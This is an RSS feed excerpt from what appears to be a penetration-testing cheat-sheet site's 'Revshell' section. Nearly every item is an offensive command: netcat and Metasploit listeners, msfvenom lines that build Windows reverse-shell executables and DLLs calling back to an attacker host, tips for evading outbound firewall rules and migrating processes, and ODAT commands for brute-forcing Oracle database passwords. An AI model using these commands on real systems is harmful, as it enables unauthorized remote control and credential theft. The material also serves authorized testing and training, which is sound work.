channel.title: Revshell on TLDRBins
channel.description: Recent content in Revshell on TLDRBins

item.title: Listeners
item.description: Listener Tools nc ncat pwncat rlwrap nc -lvnp <LOCAL_PORT> # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp <LOCAL_PORT> pwncat-cs -lp <LOCAL_PORT> # After getting a connection (local) pwncat$ back Ref: pwncat

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> set AutoRunScript multi_console_command -r automigrate.

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll Windows x86 Staged exe Stageless exe # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.

item.title: Oracle Database
item.description: Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT Enum # SID enum (You only need one) odat sidguesser -s <TARGET> # User/Password brute force odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba General # Export everytime or add to ~/.
